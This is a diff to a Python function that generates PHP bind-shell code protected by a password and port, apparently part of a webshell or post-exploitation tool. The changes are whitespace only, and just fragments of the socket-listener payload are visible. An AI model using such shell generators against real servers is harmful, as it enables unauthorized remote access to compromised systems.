@@ -1,6 +1,7 @@
 from libs.myapp import is_windows
 from libs.functions.php_ini import *
 
+
 def get_php_binshell(port, passwd):
     if (is_windows()):
         php_code = """$pass="%s";
@@ -98,7 +99,7 @@ while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
 }
 @socket_close($msgsock);
 }"""
-        return php_code% (passwd, port, get_ini_value_code())
+        return php_code % (passwd, port, get_ini_value_code())
     else:
         php_code = """$pass="%s";
 $port="%s";
@@ -139,4 +140,4 @@ while (1) {
         }
     }
 }"""
-        return php_code% (passwd, port)
+        return php_code % (passwd, port)
